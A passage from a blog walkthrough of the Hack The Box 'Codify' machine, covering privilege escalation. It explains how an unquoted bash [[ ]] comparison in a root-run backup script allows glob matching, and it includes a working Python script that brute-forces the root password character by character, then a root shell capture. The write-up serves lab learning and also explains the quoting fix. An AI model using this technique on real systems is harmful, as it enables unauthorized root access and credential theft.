+</code></pre></div></div> <h2 id="privilege-escalation">Privilege escalation</h2> <p>A helpful check for privilege escalation is to review sudo permissions.</p> <p>Using <code class="language-plaintext highlighter-rouge">sudo -l</code> it can be seen that the user has sudo rights over the <code class="language-plaintext highlighter-rouge">/opt/scripts/mysql-backup.sh</code> file.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>joshua@codify:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>joshua: 
+Matching Defaults entries <span class="k">for </span>joshua on codify:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty
+
+User joshua may run the following commands on codify:
+    <span class="o">(</span>root<span class="o">)</span> /opt/scripts/mysql-backup.sh
+
+</code></pre></div></div> <p>As the name suggests, the script is designed to back up MySQL databases.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="nv">DB_USER</span><span class="o">=</span><span class="s2">"root"</span>
+<span class="nv">DB_PASS</span><span class="o">=</span><span class="si">$(</span>/usr/bin/cat /root/.creds<span class="si">)</span>
+<span class="nv">BACKUP_DIR</span><span class="o">=</span><span class="s2">"/var/backups/mysql"</span>
+
+<span class="nb">read</span> <span class="nt">-s</span> <span class="nt">-p</span> <span class="s2">"Enter MySQL password for </span><span class="nv">$DB_USER</span><span class="s2">: "</span> USER_PASS
+/usr/bin/echo
+
+<span class="k">if</span> <span class="o">[[</span> <span class="nv">$DB_PASS</span> <span class="o">==</span> <span class="nv">$USER_PASS</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+        /usr/bin/echo <span class="s2">"Password confirmed!"</span>
+<span class="k">else</span>
+        /usr/bin/echo <span class="s2">"Password confirmation failed!"</span>
+        <span class="nb">exit </span>1
+<span class="k">fi</span>
+
+/usr/bin/mkdir <span class="nt">-p</span> <span class="s2">"</span><span class="nv">$BACKUP_DIR</span><span class="s2">"</span>
+
+<span class="nv">databases</span><span class="o">=</span><span class="si">$(</span>/usr/bin/mysql <span class="nt">-u</span> <span class="s2">"</span><span class="nv">$DB_USER</span><span class="s2">"</span> <span class="nt">-h</span> 0.0.0.0 <span class="nt">-P</span> 3306 <span class="nt">-p</span><span class="s2">"</span><span class="nv">$DB_PASS</span><span class="s2">"</span> <span class="nt">-e</span> <span class="s2">"SHOW DATABASES;"</span> | /usr/bin/grep <span class="nt">-Ev</span> <span class="s2">"(Database|information_schema|performance_schema)"</span><span class="si">)</span>
+
+<span class="k">for </span>db <span class="k">in</span> <span class="nv">$databases</span><span class="p">;</span> <span class="k">do</span>
+    /usr/bin/echo <span class="s2">"Backing up database: </span><span class="nv">$db</span><span class="s2">"</span>
+    /usr/bin/mysqldump <span class="nt">--force</span> <span class="nt">-u</span> <span class="s2">"</span><span class="nv">$DB_USER</span><span class="s2">"</span> <span class="nt">-h</span> 0.0.0.0 <span class="nt">-P</span> 3306 <span class="nt">-p</span><span class="s2">"</span><span class="nv">$DB_PASS</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$db</span><span class="s2">"</span> | /usr/bin/gzip <span class="o">&gt;</span> <span class="s2">"</span><span class="nv">$BACKUP_DIR</span><span class="s2">/</span><span class="nv">$db</span><span class="s2">.sql.gz"</span>
+<span class="k">done</span>
+
+/usr/bin/echo <span class="s2">"All databases backed up successfully!"</span>
+/usr/bin/echo <span class="s2">"Changing the permissions"</span>
+/usr/bin/chown root:sys-adm <span class="s2">"</span><span class="nv">$BACKUP_DIR</span><span class="s2">"</span>
+/usr/bin/chmod 774 <span class="nt">-R</span> <span class="s2">"</span><span class="nv">$BACKUP_DIR</span><span class="s2">"</span>
+/usr/bin/echo <span class="s1">'Done!'</span>
+
+</code></pre></div></div> <p>The script does the following:</p> <ol> <li> <strong>Setting Variables:</strong> <ul> <li> <code class="language-plaintext highlighter-rouge">DB_USER="root"</code>: Defines the database username, in this case, <code class="language-plaintext highlighter-rouge">root</code>.</li> <li> <code class="language-plaintext highlighter-rouge">DB_PASS=$(/usr/bin/cat /root/.creds)</code>: Retrieves the MySQL root user’s password from a file located at <code class="language-plaintext highlighter-rouge">/root/.creds</code>.</li> </ul> </li> <li> <strong>Password Confirmation:</strong> <ul> <li>The script prompts the user to enter the MySQL password for the root user. This is done securely (without echoing the input) using <code class="language-plaintext highlighter-rouge">read -s -p</code>.</li> <li>It then checks if the entered password (<code class="language-plaintext highlighter-rouge">USER_PASS</code>) matches the one stored in <code class="language-plaintext highlighter-rouge">/root/.creds</code> (<code class="language-plaintext highlighter-rouge">DB_PASS</code>). If they don’t match, the script prints an error message and exits.</li> </ul> </li> <li> <strong>Creating Backup Directory:</strong> <ul> <li>The script ensures that the backup directory (<code class="language-plaintext highlighter-rouge">/var/backups/mysql</code>) exists, creating it if necessary with <code class="language-plaintext highlighter-rouge">mkdir -p</code>.</li> </ul> </li> <li> <strong>Retrieving Database Names:</strong> <ul> <li>It retrieves a list of all databases (excluding <code class="language-plaintext highlighter-rouge">information_schema</code>, <code class="language-plaintext highlighter-rouge">performance_schema</code>, and the <code class="language-plaintext highlighter-rouge">Database</code> header) using a MySQL command. The list of databases is stored in the variable <code class="language-plaintext highlighter-rouge">databases</code>.</li> </ul> </li> <li> <strong>Backing Up Each Database:</strong> <ul> <li>The script loops through each database in the <code class="language-plaintext highlighter-rouge">databases</code> variable.</li> <li>For each database (<code class="language-plaintext highlighter-rouge">db</code>), it performs a backup using <code class="language-plaintext highlighter-rouge">mysqldump</code> and compresses the output to a <code class="language-plaintext highlighter-rouge">.sql.gz</code> file in the backup directory. Each backup file is named after the database.</li> </ul> </li> <li> <strong>Post-backup Steps:</strong> <ul> <li>After backing up all the databases, the script prints a success message.</li> <li>It then changes the ownership of the backup directory to the <code class="language-plaintext highlighter-rouge">root</code> user and <code class="language-plaintext highlighter-rouge">sys-adm</code> group.</li> <li>The script modifies the permissions of the backup directory and its contents to <code class="language-plaintext highlighter-rouge">774</code> (read/write/execute for owner and group, read for others).</li> <li>Finally, it prints ‘Done!’ to indicate completion.</li> </ul> </li> </ol> <p>In summary, this script is a utility for backing up all MySQL databases on a server. It first confirms that the user running the script knows the MySQL root password, then proceeds to back up each database to a specified directory, securing the backups with appropriate permissions and ownership.</p> <blockquote> <p><em>After a fair bit of research, I came across <a href="https://blnknlights.github.io/htb/machines/easy/codify/codify.html" rel="external nofollow noopener" target="_blank">this great write up</a> that put me onto a track without just giving me the answer.</em></p> </blockquote> <h3 id="shellcheck">Shellcheck</h3> <p>Using a utility called <code class="language-plaintext highlighter-rouge">shellcheck</code>, the <code class="language-plaintext highlighter-rouge">mysql-backup.sh</code> can be assessed:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="o">[</span>★]<span class="nv">$ </span>shellcheck shell.sh
+
+In shell.sh line 6:
+<span class="nb">read</span> <span class="nt">-s</span> <span class="nt">-p</span> <span class="s2">"Enter MySQL password for </span><span class="nv">$DB_USER</span><span class="s2">: "</span> USER_PASS
+^--^ SC2162: <span class="nb">read </span>without <span class="nt">-r</span> will mangle backslashes.
+
+
+In shell.sh line 9:
+<span class="k">if</span> <span class="o">[[</span> <span class="nv">$DB_PASS</span> <span class="o">==</span> <span class="nv">$USER_PASS</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+                  ^--------^ SC2053: Quote the right-hand side of <span class="o">==</span> <span class="k">in</span> <span class="o">[[</span> <span class="o">]]</span> to prevent glob matching.
+
+For more information:
+  https://www.shellcheck.net/wiki/SC2053 <span class="nt">--</span> Quote the right-hand side of <span class="o">==</span> i...
+  https://www.shellcheck.net/wiki/SC2162 <span class="nt">--</span> <span class="nb">read </span>without <span class="nt">-r</span> will mangle backs...
+
+</code></pre></div></div> <p>As shown, it gives the warning that:</p> <blockquote> <p>“<em>Quote the right-hand side of == in [[ ]] to prevent glob matching.</em>”</p> </blockquote> <h3 id="what-is-glob-matching">What is glob matching</h3> <p>Glob matching, in the context of shell scripts, refers to a feature where certain characters (like <code class="language-plaintext highlighter-rouge">*</code>, <code class="language-plaintext highlighter-rouge">?</code>, <code class="language-plaintext highlighter-rouge">[</code>, and <code class="language-plaintext highlighter-rouge">]</code>) are used as wildcards to match filenames or strings. This is commonly used in file operations but can also apply to string comparisons in conditional statements.</p> <p>In the script, <code class="language-plaintext highlighter-rouge">[[ $DB_PASS == $USER_PASS ]]</code> doesn’t quote <code class="language-plaintext highlighter-rouge">$USER_PASS</code>, which means the shell tries to perform glob matching instead of matching the literal string with the value of <code class="language-plaintext highlighter-rouge">$USER_PASS</code>. This means:</p> <ul> <li>If <code class="language-plaintext highlighter-rouge">$USER_PASS</code> contains a <code class="language-plaintext highlighter-rouge">*</code>, it could match any string of characters.</li> <li>If <code class="language-plaintext highlighter-rouge">$USER_PASS</code> contains a <code class="language-plaintext highlighter-rouge">?</code>, it could match any single character.</li> <li>If <code class="language-plaintext highlighter-rouge">$USER_PASS</code> contains <code class="language-plaintext highlighter-rouge">[</code> and <code class="language-plaintext highlighter-rouge">]</code>, it could match any characters inside the brackets.</li> </ul> <p>This behaviour can lead to unexpected results or security vulnerabilities. For instance, if <code class="language-plaintext highlighter-rouge">$USER_PASS</code> somehow contains <code class="language-plaintext highlighter-rouge">*</code>, the condition might unexpectedly evaluate to true.</p> <p>To prevent glob matching and ensure the script is comparing the actual string value of <code class="language-plaintext highlighter-rouge">$USER_PASS</code> with <code class="language-plaintext highlighter-rouge">$DB_PASS</code>, you should quote <code class="language-plaintext highlighter-rouge">$USER_PASS</code>:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="o">[[</span> <span class="nv">$DB_PASS</span> <span class="o">==</span> <span class="s2">"</span><span class="nv">$USER_PASS</span><span class="s2">"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+    ...
+<span class="k">fi</span>
+
+</code></pre></div></div> <p>This change ensures that the value of <code class="language-plaintext highlighter-rouge">$USER_PASS</code> is taken literally, without any glob matching.</p> <h3 id="brute-forcing-the-password">Brute-forcing the password</h3> <p>With the help of ChatGPT, the following script can brute force the password by glob matching the next character iteratively.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">string</span>
+<span class="kn">import</span> <span class="n">subprocess</span>
+
+<span class="k">def</span> <span class="nf">attempt_password</span><span class="p">(</span><span class="n">current_password</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="c1"># Execute the password check command
+</span>        <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">echo </span><span class="sh">'</span><span class="si">{</span><span class="n">current_password</span><span class="si">}</span><span class="s">*</span><span class="sh">'</span><span class="s"> | sudo /opt/scripts/mysql-backup.sh</span><span class="sh">"</span>
+        <span class="n">output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="nf">check_output</span><span class="p">(</span>
+            <span class="n">command</span><span class="p">,</span>
+            <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span>
+            <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">STDOUT</span><span class="p">,</span>
+            <span class="n">text</span><span class="o">=</span><span class="bp">True</span>
+        <span class="p">)</span>
+        <span class="k">return</span> <span class="sh">"</span><span class="s">Password confirmed!</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">output</span>
+    <span class="k">except</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">CalledProcessError</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">False</span>
+
+<span class="n">all_chars</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span>
+<span class="n">password</span> <span class="o">=</span> <span class="sh">""</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">all_chars</span><span class="p">:</span>
+        <span class="k">if</span> <span class="nf">attempt_password</span><span class="p">(</span><span class="n">password</span> <span class="o">+</span> <span class="n">char</span><span class="p">):</span>
+            <span class="n">password</span> <span class="o">+=</span> <span class="n">char</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Current Password: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+            <span class="k">break</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="c1"># Exit the loop if no additional character matches
+</span>        <span class="k">break</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Final Password: </span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="sh">"</span> <span class="k">if</span> <span class="n">password</span> <span class="k">else</span> <span class="sh">"</span><span class="s">Password not found.</span><span class="sh">"</span><span class="p">)</span>
+
+</code></pre></div></div> <p>With the globbed password, and switching to the <strong>root</strong> user, the final flag is captured.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>joshua@codify:~<span class="nv">$ </span>su root
+Password: 
+root@codify:/home/joshua# <span class="nb">cd</span> ~
+root@codify:~# <span class="nb">ls
+</span>root.txt  scripts
+root@codify:~# <span class="nb">cat </span>root.txt 
+&lt;REDACTED&gt;
+root@codify:~# 
+
+</code></pre></div></div> </div> </article> <br> <hr> <br> <ul class="list-disc pl-8"></ul> <h2 class="text-3xl font-semibold mb-4 mt-12">Enjoy Reading This Article?</h2> <p class="mb-2">Here are some more articles you might like to read next:</p> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/bizness-walkthrough/">Bizness</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2024/devvortex-walkthrough/">Devvortex</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2023/pilgrimage-write-up/">Pilgrimage</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2023/Sau/">Sau</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2023/assessment-planning-scoping/">Assessment planning and scoping</a> </li> </div> </div> </div> </div> <footer class="fixed-bottom"> <div class="container mt-0"> © Copyright 2024 . Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.8/dist/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?7b30caa5023af4af8408a472dc4e1ebb"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script defer src="https://unpkg.com/bootstrap-table@1.22.1/dist/bootstrap-table.min.js"></script> <script src="/assets/js/no_defer.js?d633890033921b33e0ceb13d22340a9c"></script> <script defer src="/assets/js/common.js?acdb9690d7641b2f8d40529018c71a01"></script> <script defer src="/assets/js/copy_code.js?c9d9dd48933de3831b3ee5ec9c209cac" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-JZNPNDMG9P"></script> <script>function gtag(){window.dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-JZNPNDMG9P");</script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>
